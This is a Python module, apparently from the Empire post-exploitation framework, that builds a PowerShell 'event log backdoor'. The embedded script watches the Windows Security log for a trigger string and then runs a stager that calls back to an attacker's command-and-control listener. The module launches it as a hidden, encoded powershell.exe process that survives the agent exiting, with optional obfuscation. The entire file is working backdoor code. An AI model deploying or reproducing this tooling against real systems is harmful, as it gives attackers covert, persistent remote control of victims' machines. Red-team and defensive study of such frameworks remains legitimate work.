import os

from empire.server.common import helpers
from empire.server.common.empire import MainMenu
from empire.server.core.module_models import EmpireModule
from empire.server.utils.module_util import handle_error_message


class Module:
    @staticmethod
    def generate(
        main_menu: MainMenu,
        module: EmpireModule,
        params: dict,
        obfuscate: bool = False,
        obfuscation_command: str = "",
    ):
        script = """
function Invoke-EventLogBackdoor
{
    Param(
    [Parameter(Mandatory=$False,Position=1)]
    [string]$Trigger="HACKER",
    [Parameter(Mandatory=$False,Position=2)]
    [int]$Timeout=0,
    [Parameter(Mandatory=$False,Position=3)]
    [int]$Sleep=30
    )
    $running=$True
    $match =""
    $starttime = Get-Date
    while($running)
    {
        if ($Timeout -ne 0 -and ($([DateTime]::Now) -gt $starttime.addseconds($Timeout)))
        {
            $running=$False
        }
        $d = Get-Date
        $NewEvents = Get-WinEvent -FilterHashtable @{logname='Security'; StartTime=$d.AddSeconds(-$Sleep)} -ErrorAction SilentlyContinue | fl Message | Out-String

        if($NewEvents -match $Trigger)
        {
            REPLACE_LAUNCHER
            $running=$False
        }
        else
        {
            Start-Sleep -s $Sleep
        }
    }
}
Invoke-EventLogBackdoor"""

        listener_name = params["Listener"]

        if not main_menu.listenersv2.get_active_listener_by_name(listener_name):
            # not a valid listener, return nothing for the script
            return handle_error_message("[!] Invalid listener: " + listener_name)

        stager_code = main_menu.stagergenv2.generate_launcher(
            listener_name=listener_name,
            language="powershell",
            obfuscate=False,
            encode=False,
        )

        if stager_code == "":
            return handle_error_message("[!] Error in launcher generation.")
        script = script.replace("REPLACE_LAUNCHER", stager_code)

        for option, values in params.items():
            if (
                (
                    option.lower() != "agent"
                    and option.lower() != "listener"
                    and option.lower() != "outfile"
                )
                and values
                and values != ""
            ):
                if values.lower() == "true":
                    # if we're just adding a switch
                    script += " -" + str(option)
                else:
                    script += " -" + str(option) + " " + str(values)

        out_file = params["OutFile"]
        if out_file != "":
            # make the base directory if it doesn't exist
            if (
                not os.path.exists(os.path.dirname(out_file))
                and os.path.dirname(out_file) != ""
            ):
                os.makedirs(os.path.dirname(out_file))

            with open(out_file, "w") as f:
                f.write(script)

            return handle_error_message(
                "[+] PowerBreach deaduser backdoor written to " + out_file
            )

        # transform the backdoor into something launched by powershell.exe
        # so it survives the agent exiting
        modifiable_launcher = "powershell.exe -noP -sta -w 1 -enc "
        launcher = helpers.powershell_launcher(script, modifiable_launcher)
        stager_code = "C:\\Windows\\System32\\WindowsPowershell\\v1.0\\" + launcher
        parts = stager_code.split(" ")

        # set up the start-process command so no new windows appears
        script = "Start-Process -NoNewWindow -FilePath '{}' -ArgumentList '{}'; 'PowerBreach Invoke-EventLogBackdoor started'".format(
            parts[0], " ".join(parts[1:])
        )

        return main_menu.modulesv2.finalize_module(
            script=script,
            script_end="",
            obfuscate=obfuscate,
            obfuscation_command=obfuscation_command,
        )
